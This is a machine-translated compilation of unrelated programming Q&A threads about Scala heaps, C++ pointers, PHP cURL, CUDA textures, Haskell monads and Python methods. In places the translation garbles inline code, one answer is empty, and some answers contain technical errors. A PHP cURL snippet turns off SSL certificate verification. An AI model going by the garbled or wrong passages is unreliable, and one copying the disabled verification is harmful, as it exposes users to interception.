`onUpgrade()`如果您只是想添加一个新表，请在您的方法中注释掉 DROP TABLE 命令。您可以完全控制其中的代码，`onUpgrade()`因此它可以是：

```
@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    db.execSQL("CREATE TABLE ...");
} 
```

从技术上讲，您甚至不需要增加数据库版本，只要您可以访问副本，`db`就可以执行您的 CREATE 语句。

# algorithm - 需要在 Scala 中实现二进制堆结构的建议

> ID：13537805
> 
> 赞同：5
> 
> 时间：2012-11-24T02:49:19.293
> 
> 标签：algorithm, scala, data-structures

嗯，我只是在学习 Scala，我正在尝试实现一些算法和数据结构。

我写了一些代码，旨在将向量转换为线性二进制堆。例如：

`Vector(8,3,4,6,2,5,7,9)`被转化为`Vector(9,8,7,6,2,4,5,3)`

这样，给定 index `i`，其父级位于：`(i-1)/2`或`(i-2)/2`取决于`i`奇数或对。

我把代码留在这里，我正在寻找的是一些关于如何改进我的实现的建议。或者甚至尝试另一个完全不同的方向。

您可以像这样使用它：`new Heap(Vector(8,3,4,6,2,5,7,9))`

```
class Heap(vs: Vector[Int]) {
  val heap = build()

  private def build():Vector[Int] = {   
    ((1 until vs.length) foldLeft Vector[Int](vs.head)) ( (accu, idx) =>
        fixFrom(accu :+ vs(idx), idx) )
  }

  private def fixFrom(heapToFix:Vector[Int], idx: Int): Vector[Int] = {
      val parentIndex = parent(idx)
      if(parentIndex == -1 || heapToFix(idx) <= heapToFix(parentIndex)) heapToFix
      else {
          val nextToFix = (heapToFix.updated(parentIndex, heapToFix(idx))) take idx 
          val fixed = fixFrom(nextToFix, parentIndex)
          val swap = heapToFix.updated(idx, heapToFix(parentIndex))
          fixed ++ (swap drop idx)
      }
  }

  def children(parentIndex: Int) = 
    (valid(2*parentIndex + 1), valid(2*parentIndex + 2))

  def parent(childIndex: Int) = 
    if(childIndex % 2 == 0) valid((childIndex-2)/2)
    else valid((childIndex-1)/2)

  def valid(idx:Int) =
    if(idx >= 0 && idx < vs.length) idx else -1

  override def toString = heap mkString " "
} 
```

更新 1：根据以下建议，我做了一些更改：

```
import math.Ordering.Implicits._

class Heap[T: Ordering](vs: Vector[T]) {
  val heap = build()

  private def build():Vector[T] = 
    ((0 until vs.length) foldLeft Vector.empty[T]) ( (accu, idx) =>
        fixUp(accu :+ vs(idx), idx) )

  @annotation.tailrec       
  private def fixUp(h:Vector[T], idx: Int): Vector[T] = {
      val parentIdx = parent(idx)
      if(parentIdx < 0 || h(idx) <= h(parentIdx)) h
      else fixUp(h.updated(parentIdx, h(idx)).updated(idx, h(parentIdx)), parentIdx)
  }

  def parent(idx: Int) = (idx-1) >> 1

  override def toString = heap mkString " "
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T07:02:49.003

```
import scala.math.Ordering.Implicits._

def insert[T : Ordering](heap: Vector[T], newItem: T) = {
  @annotation.tailrec
  def siftUp(h: Vector[T], idx: Int):Vector[T] = {
    val parentIdx = (idx - 1) >> 1
    if(parentIdx < 0 || h(parentIdx) > h(idx)) h
    else siftUp(h.updated(parentIdx, h(idx)).updated(idx, h(parentIdx)), parentIdx)
  }

  siftUp(heap :+ newItem, heap.length)
}
def heapify[T: Ordering](vs: Vector[T]) = vs.foldLeft(Vector.empty[T])(insert)

assert(heapify(Vector(8, 3, 4, 6, 2, 5, 7, 9)) == Vector(9, 8, 7, 6, 2, 4, 5, 3)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T04:06:00.527

向量不是平面的。它本身就是一个链表。它有一个 1:32 树，即每个节点有 32 个子节点。并按顺序填充它们。

由于您正在实现二叉堆，我们知道它是一棵平衡树。而且我们还知道，当您实现插入和删除时，树会发生一些变化。树的大小也会增加和减小。

考虑到上述事实，我建议使用可变数组对象作为主要数据类型：

```
var arr = Array[Int]() 
```

通过将其声明为 var，它将更适合大小增加和减少的情况。

但是，如果您的想法只是实现一个不可变的二进制堆，也许您不需要将其声明为“var”，但我仍然建议使用 Array[Int] 而不是 Vector[Int]，因为您不需要实现堆时的链表。

**更新（2012 年 12 月 1 日）：**我想我会尝试使用数组来实现这种方式，几个小时后，我得到了它的工作。花了相当长的时间，并且有大量的 Scala 概念：

1.  如何`<T extends Comparable<? super T>>`在 Scala 中实现 Java（有序和清单）
2.  多个构造函数
3.  使用`Option`,代替值`None`_`Some``null`
4.  数组大小调整
5.  实例化空数组

可能还有更多。它仍然有一些改进的余地，例如：

1.  使用枚举而不是传递给构造函数的字符
2.  创建一个接受函数的构造`compare`函数
3.  实现 toString

但我想我会在这里完成，除非有人想添加更多内容：

```
package com.test
import Ordering.Implicits._

/**
 * Pass 'a' to sort ascending or 'd' to sort descending
 */
class BinaryHeap[T <% Ordered[T]: Manifest](sortingOrder: Char) {

  def this() = this('d')//Default will be descending

  var arr: Array[Option[T]] = Array.empty[Option[T]]
  var num: Int = 0

  def doCompare = {
    if (sortingOrder == 'a')
      (idx1: Int, idx2: Int) => arr(idx1).get > arr(idx2).get
    else
      (idx1: Int, idx2: Int) => arr(idx1).get < arr(idx2).get
  }

  def size: Int = num
  def add(t: T): Unit = {
    resizeIfRequired
    arr(num) = Some(t)
    swim(num)
    num = num + 1
  }

  def remove: T = {
    if (num > 0) {
      val ret = arr(0)
      num = num - 1
      swap(0, num)
      arr(num) = None: Option[T]

      sink(0)
      ret.get
    } else {
      throw new Exception("Tried to remove from an empty heap")
    }
  }

  private def resizeIfRequired: Unit = {
    if (arr.length == 0)
      arr = Array.fill(1)(None: Option[T])
    else if (num == arr.length) {
      doResize(num * 2)
    } else if (num == arr.length / 2 - 1) {
      doResize(arr.length / 2)
    }
  }

  private def doResize(newSize: Int): Unit = {
    var newArr = Array.fill(newSize)(None: Option[T])
    Array.copy(arr, 0, newArr, 0, num)
    arr = newArr
  }

  private def swim(idx: Int): Unit = {
    val parentIdx = getParent(idx)
    if (doCompare(parentIdx, idx)) {
      swap(parentIdx, idx)
      swim(parentIdx)
    }

  }

  private def swap(idx1: Int, idx2: Int) = {
    val temp = arr(idx1)
    arr(idx1) = arr(idx2)
    arr(idx2) = temp
  }

  private def sink(idx: Int): Unit = {
    val leftChildIdx = getLeftChild(idx)
    val rightChildIdx = getRightChild(idx)

    if ((isValid(leftChildIdx)) && (doCompare(leftChildIdx, idx))) {
      swap(leftChildIdx, idx)
      sink(leftChildIdx)
    } else if ((isValid(rightChildIdx)) && (doCompare(rightChildIdx, idx))) {
      swap(rightChildIdx, idx)
      sink(rightChildIdx)
    }
  }

  private def isValid(idx: Int): Boolean = {
    idx < num
  }

  private def getParent(idx: Int): Int = {
    idx / 2
  }

  private def getLeftChild(idx: Int): Int = {
    2 * idx + 1
  }

  private def getRightChild(idx: Int): Int = {
    2 * idx + 2
  }

  def printOrdered: Unit = {
    if (num == 0) {
      println("Heap is empty")
    } else {
      (0 until num) map (x => println(arr(x).get))
    }
  }

} 
```

# c++ - 结构中的指针问题

> ID：13537806
> 
> 赞同：2
> 
> 时间：2012-11-24T02:49:20.480
> 
> 标签：c++, pointers, struct

我在返回指向结构的指针时遇到问题。有人可以解释我做错了什么吗？我希望`search()`返回一个指向匹配输入的指针。这将被存储到一个向量中，以防它们在“数组”中重复。这似乎可行，但是我无法从返回的指针中获取“数据”？

```
struct Node
{
    int data;
    Node *left;
    Node *next;
};

vector<Node *> array;

void find(int & input)
{
     currentSize = 0;
     vector<Node *> hold;

    for( int i = 0; i < array.size( ); i++ ){
        if(search(array[i], input) != NULL)
        {
            hold.push_back(search(array[i], input));
        }
        else{
            cout << "The Key is not found" << endl;
        }

    }

    for(int i = 0; i < hold.size(); i++)
    {
        cout << hold[i] << endl;
        //Problem here:: I want to see the "data" that the search function returned not the hex value
    }
}

Node * search(Node * x, const int & input)
{
    if( x == NULL )
    {
       return NULL;
    }
    else
    {
        if(input == x->element)
        {
            return x;
        }
            search(x->left, input);
            search(x->next, input);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:52:08.153

您需要打开编译器警告。

并非所有搜索的代码路径都返回一个值，特别是，如果您的编译器没有脑死亡，您应该得到警告。

要解决此问题，请替换此：

```
 search(x->left, input);
            search(x->next, input);
    }
} 
```

和：

```
 Node* leftSearch = search(x->left, input);
            if (leftSearch)
              return leftSearch;
            return search(x->next, input);
    }
} 
```

`search()`递归调用不会自动将它们的返回值传递给当前函数的返回值。:)

此外，正如 Zack 所指出的，您需要查看 的某些子字段`Node`才能打印它。首先检查返回值是否为`nullptr`（或`NULL`在不支持 C++11 的编译器中）（如果为 null，则无法安全地取消引用它，它表示搜索失败）。

如果不是`nullptr`'，请`->data`在打印之前对其进行操作。

即，改变：

```
 cout << hold[i] << endl; 
```

至：

```
 if (hold[i]) {
      cout << "Found: " << hold[i]->data << "\n";
    } else {
      cout << "Not Found\n";
    } 
```

请注意，我没有使用`std::endl`，因为我认为不需要刷新每一行的缓冲区。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T02:51:48.383

您正在打印`hold[i]`，它是指向节点的指针，而不是`hold[i]->data`，这是您想要打印的内容。

此外，这段代码几乎肯定会像筛子一样泄漏和/或破坏堆，但是您没有显示足够的代码让我告诉您那里出了什么问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T02:52:29.023

```
 search(x->left, input);
        search(x->next, input); 
```

这两个调用的结果只是被忽略了。您可能应该存储第一次搜索的结果，如果不是`NULL`，则返回它，否则返回第二次搜索的结果

```
Node* res = search(x->left, input);
if (res) return res;
return search(x->next, input); 
```

# php - PHP cURL 未发送适当的标头

> ID：13537807
> 
> 赞同：3
> 
> 时间：2012-11-24T02:49:29.753
> 
> 标签：php, curl, header

我正在尝试在 PHP 中使用 cURL 发送一些标头，但标头未发送。

代码是：

```
$header = array('Referer: xxx',
        'Origin: xxx',
        'Content-Type: application/x-www-form-urlencoded',
        'Connection: keep-alive',
        'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Cache-Control: max-age=0',
        'Except:'); 
```

并使用这个：

```
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_URL, $url);
$t = curl_exec($ch);

$sentHeaders = curl_getinfo($ch);

var_dump($sentHeaders); 
```

在转储中，我没有看到 Origin、content-type、referrer，什么都没有……我正在尝试发送 POST，但它没有发送。

我做错了什么？

编辑：现在 POST 没有发送：

```
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLINFO_HEADER_OUT, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_URL, $url);
$t = curl_exec($ch); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:53:43.563

添加此选项以查看`getinfo`调用中的请求标头：

```
curl_setopt($ch, CURLINFO_HEADER_OUT, true); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-14T16:02:14.933

关于您的 POST 问题：请务必使用`http_build_query()`. 所以它需要在你的代码中：

```
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data) ); 
```

希望能帮助到你

# c++ - 使用迭代器从字符串中删除特殊字符

> ID：13537808
> 
> 赞同：3
> 
> 时间：2012-11-24T02:50:34.667
> 
> 标签：c++, string, iterator, special-characters, erase

今天我有一个非常简单的给你，但它确实让我难倒了好几个小时。我想我的字符串迭代器的字幕有问题。我在网上查看了代码，甚至将代码传递给了我的 CSE 教授——但由于感恩节假期，他只有手机，无法提供太多帮助。

希望有人可以看到这个并立即发现问题。作为说明，我的目标只是从字符串中删除特殊字符。该字符串通过引用传递给函数（因此不需要返回类型）。作为补充说明，我正在努力使其尽可能高效。我最初的想法是简单地将其转移到嵌套的 for 循环，但我的 CSE 教授认为，在某些特殊情况下，内部带有字符串迭代器的 for 循环更有效，所以我应该坚持下去。请让我知道是否有人可以提供帮助！

在我看来，问题必须出在 remove 函数上，因为 remove 需要一个 const char *，而不仅仅是一个 char *。我假设 text.begin() 不是 const ，因此会导致问题。但是如果我把函数的参数设为const string &text，我们显然不能通过引用来修改文本。

这是我到目前为止的代码：

我们主要有：

```
 string temp = "~cool~";
 XML * parser = new XML();
 parser->clearSpecialChars(temp);
 cout << temp; 
```

功能是：

```
void XML::clearSpecialChars(string &text)
{
    char chars[]= ".,!()1234567890[]'<>:/{}_|=+;-`~";
        for (unsigned int i = 0; i < 33; ++i)
        {
            text.erase(std::remove(text.begin(),text.end(),chars[i]),text.end());
        }
 } 
```

但是，我收到以下编译器错误：

```
 XML.cpp: In member function ‘void XML::clearSpecialChars(std::string&)’:
 XML.cpp:86:69: error: cannot convert ‘std::basic_string<char>::iterator {aka __gnu_cxx::__normal_iterator<char*, std::basic_string<char> >}’
 to ‘const char*’ for argument ‘1’ to ‘int remove(const char*)’ 
```

任何想法将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:57:54.680

有两个函数称为`remove`. 以下是对他们每个人的描述：

[http://www.cplusplus.com/reference/algorithm/remove/](http://www.cplusplus.com/reference/algorithm/remove/)

[http://www.cplusplus.com/reference/clibrary/cstdio/remove/](http://www.cplusplus.com/reference/clibrary/cstdio/remove/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T04:40:54.200

硬编码的“33”让我畏缩。您真的希望 '\x00' 包含在您的特殊字符集中吗？

如果可能，现代 C++ 将循环卸载到库例程。这是一个不同的实现。

```
void XML::clearSpecialChars(string &text)
{
    const string chars = ".,!()1234567890[]'<>:/{}_|=+;-`~\x00";

    auto new_end = std::remove_if(text.begin(), text.end(), 
        [chars](string::value_type c)
            { return chars.find(c) != string::npos; });
    text.erase(new_end, text.end());
} 
```

# javascript - qTip2 - 更改类更改时使用的工具提示内容

> ID：13537810
> 
> 赞同：2
> 
> 时间：2012-11-24T02:51:16.180
> 
> 标签：javascript, jquery, class, qtip2

我正在使用 qTip2，并且我有一个带有工具提示的链接列表。我从链接中名为“data-normal”的属性中读取工具提示内容。每个链接旁边都有一个复选框，单击它会删除该链接的类并添加一些其他类。当这样更改链接时，我希望工具提示保持不变，但要从不同的属性（“数据更改”）中读取。

此外，当未选中该框（并且还原类）时，我希望它像更改之前一样运行。

有解决方案吗？

这是我用于此的一段代码：

```
$('.normal').qtip({
    content: {
    text: function(api) {
        return $(this).attr('data-normal');
        }
    }
});

$('.changed').qtip({
    content: {
    text: function(api) {
        return $(this).attr('data-changed');
        }
    }
}); 
```

这是我的问题的 jsfiddle：http: [//jsfiddle.net/trunkadelic/Xkvnt/1/](http://jsfiddle.net/trunkadelic/Xkvnt/1/)

这当然是我在网站本身上尝试做的一个简化示例。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T15:55:54.333

```
$("a").qtip({
    content: {
        text: function(api) {
            if ($(this).hasClass('changed')) {
                return $(this).attr('data-changed');
            } else {
                return $(this).attr('data-normal');

            }
        }
    }
}); 
```

这应该有效。这是您更新的示例：http: [//jsfiddle.net/Xkvnt/5/](http://jsfiddle.net/Xkvnt/5/)

# image-processing - CUDA Texture Cache似乎有错误的数据？

> ID：13537816
> 
> 赞同：3
> 
> 时间：2012-11-24T02:52:29.913
> 
> 标签：image-processing, cuda, gpu, gpgpu, nvidia

我编写 CUDA 代码已经有一段时间了，但我现在才开始了解如何使用纹理缓存。

使用`simpleTexture`来自 Nvidia SDK 的示例作为灵感，我编写了一个使用纹理缓存的简单示例。主机将 Lena 图像复制到 GPU 并将其绑定为纹理。内核只是将纹理缓存的内容复制到一个输出数组中。

奇怪的是，结果（参见代码下方的全灰色图像）与输入不匹配。**关于可能出现问题的任何想法？**

代码（看`texCache_dummyKernel`）：

```
texture<float, 2, cudaReadModeElementType> tex; //declare texture reference for 2D float texture

//note: tex is global, so no input ptr is needed
__global__ void texCache_dummyKernel(float* out, const int width, const int height){ //copy tex to output
    int x = blockIdx.x*blockDim.x + threadIdx.x; //my index into "big image"
    int y = blockIdx.y*blockDim.y + threadIdx.y;
    int idx = y*width+x;

    if(x < width && y < height)
        out[idx] = tex2D(tex, y, x);
}

int main(int argc, char **argv){        
    cv::Mat img = getRawImage("./Lena.pgm");
    img.convertTo(img, CV_32FC1);
    float* hostImg = (float*)&img.data[0];
    int width = img.cols; int height = img.rows;

    dim3 grid;  dim3 block;
    block.x = 16;  block.y = 16;
    grid.x = width/block.x + 1;          
    grid.y = height/block.y + 1;

    cudaArray *dImg; //cudaArray*, not float*
    cudaChannelFormatDesc channelDesc = cudaCreateChannelDesc(32, 0, 0, 0, cudaChannelFormatKindFloat);        
    CHECK_CUDART(cudaMallocArray(&dImg, &channelDesc, width, height));
    CHECK_CUDART(cudaMemcpyToArray(dImg, 0, 0, hostImg, width*height*sizeof(float), cudaMemcpyHostToDevice));
    setTexCacheParams(); //defined below
    CHECK_CUDART(cudaBindTextureToArray(tex, dImg, channelDesc)); //Bind the array to the texture

    float* dResult; //device memory for output
    CHECK_CUDART(cudaMalloc((void**)&dResult, sizeof(float)*width*height));

    texCache_dummyKernel<<<grid, block>>>(dResult, width, height); //dImg isn't an input param, since 'tex' is a global variable
    CHECK_CUDART(cudaGetLastError()); //make sure kernel didn't crash

    float* hostResult = (float*)malloc(sizeof(float)*width*height);
    CHECK_CUDART(cudaMemcpy(hostResult, dResult, sizeof(float)*width*height, cudaMemcpyDeviceToHost));
    outputProcessedImage(hostResult, width, height, "result.png"); //defined below
} 
```

我可能应该提供我上面使用的几个辅助函数：

```
void setTexCacheParams(){ //configuration directly pulled from simpleTexture in nvidia sdk
    tex.addressMode[0] = cudaAddressModeWrap;
    tex.addressMode[1] = cudaAddressModeWrap;
    tex.filterMode = cudaFilterModeLinear;
    tex.normalized = true;    // access with normalized texture coordinates
}

void outputProcessedImage(float* processedImg, int width, int height, string out_filename){
    cv::Mat img = cv::Mat::zeros(height, width, CV_32FC1);
    for(int i=0; i<height; i++)
        for(int j=0; j<width; j++)
            img.at<float>(i,j) = processedImg[i*width + j]; //just grab the 1st of the 4 pixel spaces in a uchar4

    img.convertTo(img, CV_8UC1); //float to uchar
    vector<int> compression_params;
    compression_params.push_back(CV_IMWRITE_PNG_COMPRESSION);
    compression_params.push_back(9);
    cv::imwrite(out_filename, img, compression_params);
} 
```

输入：

![在此处输入图像描述](../Images/842baf9081a5d0a0777e1072a3e23aa5.png)

输出：

![在此处输入图像描述](../Images/a227cde4d902888be082f5626444b54d.png)

* * *

*   对不起，这篇文章是这样一堵代码墙！对于使这样的代码更简洁的任何建议，我将不胜感激。
*   我在上面的文件 I/O 中使用了 OpenCV……希望这不会造成混淆。
*   当我更改内核以从一维数组中读取输入图像`float*`，并且我几乎保持其他所有内容相同时，我得到了正确的结果。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T08:34:07.977

在您的原始代码中，您已将纹理初始化为使用*归一化坐标*。这意味着纹理在每个空间维度的 [0,1] 上进行寻址。所以你的内核应该是这样的：

```
__global__ 
void texCache_dummyKernel(float* out, const int width, const int height)
{
    int x = blockIdx.x*blockDim.x + threadIdx.x; //my index into "big image"
    int y = blockIdx.y*blockDim.y + threadIdx.y;
    int idx = y*width+x;

    if(x < width && y < height) {
        float u = float(x)/float(width), v = float(y)/float(height);
        out[idx] = tex2D(tex, u, v);
    }
} 
```

[标准免责声明：用浏览器编写，未经编译或测试，使用风险自负]

IE。您应该传递`tex2D`通过除以图像宽度和高度来归一化的坐标。

或者，正如您所发现的，您可以将纹理定义更改为`normalized=false`并在绝对而不是相对纹理坐标中使用寻址。即使这样，在您的代码中读取的纹理也应该如下所示：

```
out[idx] = tex2D(tex, float(x)+0.5f, float(y)+0.5f); 
```

因为纹理寻址总是使用浮点坐标完成，并且纹理数据以*体素为中心*，因此每个坐标添加 0.5 以确保读取来自纹理内每个插值区域或体积的质心。

您可以在 CUDA C 编程指南的一个附录中找到纹理过滤和寻址模式的描述及其对插值的影响。

# node.js - nodejs请求地址翻译

> ID：13537821
> 
> 赞同：1
> 
> 时间：2012-11-24T02:52:58.293
> 
> 标签：node.js

我有一些链接，我需要该节点将其转换为其他链接以提供服务就像我正在提供一些网页但用户无法看到该链接的直接地址，因此节点充当代理之王来掩盖该地址并提供该地址页

有什么办法吗？

欢迎任何帮助

问候

# haskell - 构建一个嵌套的 Monad

> ID：13537822
> 
> 赞同：2
> 
> 时间：2012-11-24T02:53:10.680
> 
> 标签：haskell

我有两种自己的数据类型如下：

```
Block a = NoValue | Value a
data GraphAMT a = GraphAMT_ [[Block a]] 
```

现在，我想为他们制作实例单子，比如

```
instance Monad Block where
     return a = Value a
     NoValue >>= f = NoValue
     Value a >>= f = f a
     fail _ = NoValue

instance Monad GraphAMT where
     return a = GraphAMT_ [[Value a]]
     GraphAMT_ xs >>= f = ...? 
```

我想知道 GraphAMT 是否可以是单子？如果是，那么如何构建它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T02:37:55.197

```
module MatrixOfMatrices where 
```

## 将函数应用于矩阵的元素

```
data Block a = NoValue | Value a  deriving Show
data GraphAMT a = GraphAMT_ [[Block a]]  deriving Show 
```

首先，你不需要 Monad 为每个元素添加三个，你需要`fmap`，所以你应该让你的类型成为 Functor 的实例，但首先创建`Block`一个 functor 是最简单的：

```
instance Functor Block where
  fmap f NoValue  = NoValue
  fmap f (Value a) = Value (f a)

instance Functor GraphAMT where
 fmap f (GraphAMT_ xss) = GraphAMT_ . (map . map . fmap $ f) $ xss 
```

什么时候

```
testData = GraphAMT_ [[NoValue,Value 2],[Value 56,Value 45,NoValue],[NoValue]] 
```

然后

```
*MatrixOfMatrices> testData
GraphAMT_ [[NoValue,Value 2],[Value 56,Value 45,NoValue],[NoValue]]
*MatrixOfMatrices> fmap (*10) testData
GraphAMT_ [[NoValue,Value 20],[Value 560,Value 450,NoValue],[NoValue]] 
```

如你所愿。

## 将矩阵变成 Monad

哎呀！我们需要定义`(>>=) :: GraphAMT a -> (a -> GraphAMT b) -> GraphAMT b`. 它应该采用一个将元素转换为矩阵的函数，按元素应用它，然后将生成的矩阵矩阵连接到一个矩阵中。

这样做的问题是没有明显的方法可以将矩阵矩阵变成单个矩阵，就像列表列表变成列表一样。如果元素都是数字，我们可以把它们加在一起，形成一个最大尺寸的矩阵。但是我们不能使用这样的解决方案，因为 Monad 无法使用有关其元素的任何事实，因为它们必须适用于所有类型的元素。

没有明确的方法可以做到这一点 - 您可以通过加宽每一行以容纳传入矩阵的值将它们彼此相邻，或者使用转置将它们放在彼此下方。您可以根据每个矩阵在矩阵中的位置开始重叠。

# github - 如何在 GitHub 风格的 Markdown 中向标题添加尾随 #（哈希）？

> ID：13537826
> 
> 赞同：6
> 
> 时间：2012-11-24T02:53:44.453
> 
> 标签：github, markdown, github-flavored-markdown

我有一个`README.md`markdown 文件，用于描述托管在 GitHub 上的项目。在这个文件中，我有几个标题和子标题，每个标题都以一个或多个哈希开头，就像在降价中一样。

现在我想将一个标题的文本设置为`C#`，但 GitHub 不尊重文本的一部分哈希，而是将其解释为标题的（可选）结束哈希。

即使我通过在哈希前面加上反斜杠来转义它，它也不起作用。所以如果我输入

```
## C# 
```

我得到：

```
C 
```

如果我使用

```
## C\# 
```

我得到：

```
C\ 
```

我如何以正确的方式写这个标题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-24T11:23:10.060

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-03-03T20:58:45.787

An alternative to try is adding another trailing `#` because they act like brackets on the line, so `## C# #` or `## C# ##` if you want to balance out the characters.

# c# - 在 XNA C# 中寻找镜头物理的焦点

> ID：13537827
> 
> 赞同：2
> 
> 时间：2012-11-24T02:53:47.640
> 
> 标签：c#, xna, physics, game-physics

我想知道是否有人为 XNA 做过涉及镜子和镜头的物理。特别是如何找到焦点、放大倍率、像距和像高？

# python - python方法窃取器

> ID：13537828
> 
> 赞同：8
> 
> 时间：2012-11-24T02:54:06.437
> 
> 标签：python, oop

如何“窃取”或将方法从一个类复制到另一个类？

示例代码：

```
class A(object):
  def foo(self):
    print "blah"

class B(object):
  foo = A.foo

B().foo() 
```

预期输出：

```
"blah" 
```

反而：

> TypeError：必须以 A 实例作为第一个参数调用未绑定的方法 foo()（什么都没有）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-24T03:03:21.040

使用`__func__`：

```
>>> A.foo
<unbound method A.foo>
>>> A.foo.__func__
<function foo at 0x00BC5F70>
>>> class B(object):
...   foo = A.foo.__func__
...
>>> B().foo()
"blah" 
```

引用[文档](http://docs.python.org/dev/reference/datamodel.html)：

> 实例方法对象结合了一个类、一个类实例和任何可调用对象（通常是用户定义的函数）。
> 
> 特殊的只读属性：__self__ 是类实例对象，__func__ 是函数对象；__doc__ 是方法的文档（与 __func__.__doc__ 相同）；__name__ 是方法名（与 __func__.__name__ 相同）；__module__ 是定义该方法的模块的名称，如果不可用，则为 None。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T03:07:56.970

这里的问题是它是您试图窃取的绑定方法，但是，您的示例不涉及使用实例状态 ( `self`) 的函数。因此，您有两个直接的选择：

1.  定义`A.foo`静态方法（`@staticmethod`装饰器）
2.  装饰或包装函数以传递未使用的参数。例如使用`functools`.

例如。

```
import functools
stolen = functools.partial(A.foo, None) 
```

这是有效的，因为您的方法不使用实例状态，并且不需要创建子类。

为了进一步修饰，绑定实例方法（如`A.foo`）需要绑定实例参数（`self`，其中 self 是 的实例`A`）。在正常使用中，第一个参数是自动传递的：

```
a = A() 
```

现在：

```
a.foo()
A.foo(a) 
```

...都是等价的。在第一种情况下，语法从词汇的角度`instance.bound_method()`推断（解析为）。这就是调用会导致错误的原因，因为它需要一个.`InstanceClass.bound_method(instance)``instance``self``A.foo()``A`

上面的解决方案所做的是将函数变形为将 a`None`作为实例传递的函数，因为无论如何都不会使用该实例（没有基于状态的逻辑）。在使用静态方法的情况下，它会删除第一个隐含的预期绑定实例参数`self`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-24T02:59:08.493

您可以在此处使用[类继承](http://en.wikipedia.org/wiki/Inheritance_%28object-oriented_programming%29)。继承允许您基于另一个对象创建一个对象，继承其所有功能和属性。

在这种情况下，它看起来像：

```
class A(object):
  def foo(self):
    print "blah"

class B(A):
  # You can add new methods or attributes here,
  #  or even overwrite those inherited from A if you
  #  really want to, though you have to be careful with that.
  pass 
```

在那次声明之后，

```
>>> B().foo()
"blah" 
```

这有效，因为：

*   您创建了类`A`，并为它创建了一个方法`foo`。
*   您创建了`B` *继承*自 的类`A`，这意味着当`A`“诞生它”时，它就`B`拥有了所有的东西`A`。
    *   在我们的例子中，`B`是 的精确副本`A`，因为我们没有对它做任何其他事情。但是，我们可以进行更改或添加更多方法。

一个例子：

```
class A(object):
    def foo(self):
        print "blah"

class B(A):
   def newfoo(self):
       print "class A can't do this!" 
```

在使用中，我们会看到：

```
>>> A().foo()
blah
>>> B().foo()
blah
>>> A().newfoo()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'A' object has no attribute 'newfoo'
>>> B().newfoo()
class A can't do this! 
```

特别是，您上面的代码不起作用的原因是，当您尝试设置时`B.foo`，您写了

```
class B(object):
    foo = A.foo 
```

代替

```
class B(object):
    foo = A().foo 
```

当您在`A.foo`没有 的情况下编写时，您是直接从*type*`()`请求方法，这在 Python 中是行不通的。如果你要这样做，你要做的是实例化一个对象，然后获取其方法的副本，然后分配它。 `A` *`foo = A().foo``A``foo`*

 ** * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-08-05T15:09:47.260

它在 Python 3 中有效，因为*未绑定的方法*已被删除（参见 Guido van Rossum 的[文章](https://python-history.blogspot.com/2009/02/first-class-everything.html)）。

但是请注意，未绑定的方法是一个函数包装器，用于隐式检查第一个传递的参数是否是定义该方法的类的实例，这是通常不应违反的方法的先决条件。错误消息为您提供了正确的解决方案，即继承：

```
class B(A):
    pass 
```

一般来说，您不应该*从*非基类中窃取方法，因为它会中断非基类中的`super()`调用（简称`super(__class__, self)`）。确实，这个程序：

```
class A(object):

    def foo(self):
        print "blah"
        super().__init__()

class B(object):
    foo = A.foo.__func__

B().foo() 
```

提出：

```
TypeError: super(type, obj): obj must be an instance or subtype of type 
```

这是因为`super(__class__, self)`首先检查 that`self`是 的实例（或子类型）`__class__`，即`A`。然而你传递了一个`B`实例，`B`而不是`A`. 因此 Python 2 未绑定方法的错误消息很有帮助。*

# python - 在 python BeautifulSoup4 中，将字符串转换为 find() 的参数

> ID：13537829
> 
> 赞同：3
> 
> 时间：2012-11-24T02:54:13.960
> 
> 标签：python, beautifulsoup

我有一个简单的 Python 脚本，它使用 BeautifulSoup 来查找 HTML 树的一部分。例如，要查找`<div id="doctext">`标签内的所有内容，脚本会执行以下操作：

```
html_section = str(soup.find("div", id="doctext")) 
```

但是，我希望能够`find()`根据输入文件中给出的字符串使参数发生变化。例如，用户可以为脚本提供一个 URL，后跟一个类似 的字符串`"div", id="doctext"`，脚本会相应地调整查找。想象一下输入文件是这样的：

```
http://www.example.com | "div", id="doctext" 
```

该脚本将行拆分以获取 URL，这可以正常工作，但我希望它也可以获取参数。例如：

```
vars = line.split(' | ')
html = urllib2.urlopen(vars[0]).read()
soup = BeautifulSoup(html)
args = vars[1].split()
html_section = str(soup.find(*args)) 
```

